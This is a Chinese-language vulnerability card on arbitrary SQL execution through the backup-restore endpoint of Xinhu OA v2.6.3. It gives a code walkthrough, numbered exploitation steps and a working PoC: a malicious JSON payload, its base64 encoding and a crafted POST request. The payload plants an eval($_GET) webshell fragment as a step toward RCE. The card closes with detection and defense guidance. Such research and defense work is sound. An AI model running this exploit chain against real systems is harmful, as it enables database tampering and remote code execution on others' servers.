---
id: web-generic-sqli-xinhu-beifen-huifdatanew-createsql-arbitrary-sql
title: 信呼OA v2.6.3 备份恢复 huifdatanewAjax：JSON 里的 createsql 被 db->query 直接执行，adminid=1 可任意 SQL
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-beifen-huifdatanew-createsql-arbitrary-sql
aliases:
- 信呼OA 备份恢复 SQL 执行
- huifdatanewAjax
- createsql 任意 SQL
- getbfdata json_decode
- 表已恢复
- 信呼 OA 后台 SQL 执行
tags:
- web
- php
- xinhu
- oa
- arbitrary-sql
- backup-restore
- adminid-1
- file-upload-chain
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: v2.6.3（原文标记：测试版本，最新版）
verification:
  verified_by: verifier-V305
  verified_at: '2026-11-08T11:50:48+08:00'
  notes: 已对照原文核对：beifenAction huifdatanewAjax 仅 adminid=1 可用、demo 模式退出；folder/sid 来自 POST，filepath=UPDIR/data/<folder>/<sid>；getbfdata 对非 { 开头内容先 mcypt_decrypt 再 json_decode（图08）；表不在 alltabls 时取 createsql 交 db->query 执行；PoC base64 解码为 {"kqj1_u1.jpg":{"createsql":"update xinhu_flow_set set name=..."}}；图13 请求 folder=.*/./face&sid=kqj1_u1.jpg 响应『表已恢复』。修正：xssrepstr 字符表不含 /，已改卡片表述。dedup 与 openbase/base64-filter 等既有信呼 SQL 卡为 related（cos 0.87），本卡为整条 createsql 执行非拼接注入；dup-scan 无本篇 pair。affected_versions 按原文测试版本 v2.6.3（最新版）保留。未验证点：未在本机复现；folder=.*/./face 的路径解析机制原文未说明。无 sources/source_url。
---

## 一句话结论

信呼OA v2.6.3 的 `webmain/system/beifen/beifenAction.php::huifdatanewAjax` 从 `UPDIR/data/<folder>/<sid>` 读取 JSON 备份，如果 JSON 里的表名不在数据库现有表中，就取该表对象的 `createsql` 字段交给 `$this->db->query($createsql, false)` 直接执行；`folder` 与 `sid` 都由请求控制，配合一个“文件名可预测”的上传点放入 JSON，就能在 `adminid=1` 的管理员会话下执行任意 SQL——原文用它把 `flow_set.name` 改成 `*/eval($_GET['pwa']);/*`，绕过界面输入过滤，为后续 RCE 铺路。

## 原理

- **入口与权限**：`huifdatanewAjax()` 首先 `if(getconfig('systype')=='demo')exit();`，然后 `if($this->adminid!=1)return '只有ID=1的管理员才可以用';`——只有内置 ID=1 管理员可用，demo 模式直接退出。
- **文件路径**：`$folder = $this->post('folder');`、`$sida = explode(',', $this->post('sid'));`；循环中 `$filepath = ''.UPDIR.'/data/'.$folder.'/'.$id.'';`，`folder` 可包含 `.*/./` 之类的相对片段，`sid` 是文件名；`if(!file_exists($filepath))continue;`。
- **解析备份**：`$data = m('beifen')->getbfdata('', $filepath);` → `getbfdata` 用 `file_get_contents` 读文件；若前 2 字节不是 `{` 就先 `mcypt_decrypt`，然后 `json_decode($cont, true)`。
- **表名与 SQL**：
  ```php
  $tab = str_replace('_'.$fieldshu.'_'.$total.'.json', '', $id); // 表
  $dataarr = $data[$tab];
  if(!in_array($tab, $alltabls)){            // 数据库里没有这个表
      $createsql = arrvalue($dataarr, 'createsql');
      if($createsql){ $this->db->query($createsql, false); }
  }
  ```
  `$tab` 是上传文件名（去掉 `_字段数_总数.json` 后缀），`$data[$tab]['createsql']` 完全来自 JSON 内容；代码没有对 SQL 做任何白名单/解析/参数化，直接执行整条语句。
- **为什么是任意 SQL 而不是注入**：攻击者不是闭合某个既有查询的引号，而是直接提供完整 SQL（`update`/`insert`/`delete` 等）；`query(..., false)` 关闭错误输出，执行失败也不回显。
- **与输入过滤的关系**：后台“新增流程模块”的 `xssrepstr` 会删除 `(`,`)`,`*`、空格、`<`、`>`、`\` 等字符（不含 `/`），`*/eval($_GET['pwa']);/*` 中的 `*`、`(`、`)` 会被过滤，无法从 UI 写入；本接口执行 SQL 时完全绕过这些字符过滤，所以能把 payload 写进 `flow_set.name`。
- **前置：可控文件名**：`sid` 必须对应真实存在的文件；普通上传返回随机文件名，无法提前写入 JSON 的键。原文用 `openkqj` 的 `headpic` 写入 `kqj<snid>_u<uid>.jpg`（见关联卡），得到已知文件名后再用 `folder=.*/./face` 指到 `UPDIR/face` 目录。

## 触发条件

- 信呼OA v2.6.3（原文测试版本，最新版）。
- 已取得 `adminid=1` 的管理员会话（内置超级管理员）；`systype` 不是 `demo`。
- 能向 `UPDIR/data/<folder>` 或可被 `folder` 相对路径指到的目录写入一个内容可控、文件名已知的 JSON 文件（如 `openkqj` headpic 写 `UPDIR/face/kqj1_u1.jpg`）。
- 数据库用户有执行目标语句的权限（通常为业务库全权限）。

## 利用步骤

1. 构造 JSON：键为可控文件名，值为含 `createsql` 的对象，例如：
   `{"kqj1_u1.jpg":{"createsql":"update xinhu_flow_set set name=\"*/eval($_GET['pwa']);/*\" where id=163;"}}`
2. 用可控文件名上传点把 JSON 内容写到已知路径（原文：`openkqj` API 的 `headpic`，文件名 `kqj1_u1.jpg`）。
3. 提交恢复请求：`POST /index.php?a=huifdatanew&d=system&m=beifen&ajaxbool=true`，`folder=.*/./face&sid=kqj1_u1.jpg`；响应“表已恢复”即已进入 `createsql` 分支。
4. 验证 SQL 是否生效：查询/页面确认 `flow_set.name` 已被改成 payload（原文的流程模块列表第 4 行显示 `*/eval($_GET['pwa']);/*`）。
5. 继续触发 RCE（关联卡），或直接用同接口执行插入管理员、改配置等任意 SQL。

## PoC

恶意备份 JSON（原文 payload 解码后）：

```json
{"kqj1_u1.jpg":{"createsql":"update xinhu_flow_set set name=\"*/eval($_GET['pwa']);/*\" where id=163;"}}
```

Base64（原文 `headpic` 值）：

```text
eyJrcWoxX3UxLmpwZyI6eyJjcmVhdGVzcWwiOiJ1cGRhdGUgeGluaHVfZmxvd19zZXQgc2V0IG5hbWU9XCIqXC9ldmFsKCRfR0VUWydwd2EnXSk7XC8qXCIgIHdoZXJlIGlkPTE2MzsifX0=
```

恢复请求：

```http
POST /index.php?a=huifdatanew&d=system&m=beifen&ajaxbool=true HTTP/1.1
Content-Type: application/x-www-form-urlencoded

folder=.*/./face&sid=kqj1_u1.jpg
```

响应（原文）：

```text
表已恢复
```

## 变体与关联

- **前置写入**：[[web-generic-file-upload-xinhu-openkqj-headpic-controlled-filename-write]] 提供 `kqj<snid>_u<uid>.jpg` 的可控文件名与内容；也可用其它能控制文件名/路径的上传点或文件写入漏洞。
- **后续 RCE**：[[web-php-rce-xinhu-flowaction-inputaction-generated-mode-file-comment-breakout]] 用本接口改写 `flow_set.name`，再触发 `inputAction` 生成带 `eval` 的 PHP 文件。
- **同产品 SQL 注入**：[[web-generic-sqli-xinhu-getmfilv-fname-base64-insert]]、[[web-generic-sqli-xinhu-openbase-querydata-basemodenum-initbase]]、[[web-generic-sqli-xinhu-base64-filter-bypass-admin-actions]]；本卡是“直接执行完整 SQL”而非注入既有查询。
- **同类备份恢复执行**：其它 CMS 的恢复/导入功能若把 JSON/XML 中的 SQL 直接 `query`，也可套用“上传可控文件 + 恢复接口”的组合。
- **边界**：`adminid` 必须为 1；`getbfdata` 对非 `{` 开头的内容会先 `mcypt_decrypt`，所以 JSON 必须以 `{` 开头（原文 payload 满足）；`query` 可能只支持单条语句，多语句需拆多次；文件路径与 `folder` 的相对层级需按部署调整。

## 检测与防御

- **不要执行备份中的 SQL**：恢复功能应只接受结构化数据（逐表逐字段插入），禁止 `createsql` 这类原始 SQL 字段；对表名/字段名做白名单，使用参数化查询。
- **备份完整性**：备份文件加签名/加密并校验来源；恢复接口限制为受信任的运维账号，`adminid=1` 不应作为唯一防线。
- **上传隔离**：备份目录与上传目录分离，上传文件名随机化并禁止路径穿越；`folder`/`sid` 做 `realpath` 前缀校验。
- **检测**：监控 `huifdatanew` 请求中 `folder` 含 `..`、`./`、`*` 或 `sid` 指向上传目录；审计 `flow_set.name` 等配置表出现 `*/`、`eval`、`$_GET`、`update ` 等异常值；对备份恢复后的配置变更告警。
- **合规**：仅在授权环境复现；不要在生产 OA 上执行任意 SQL。
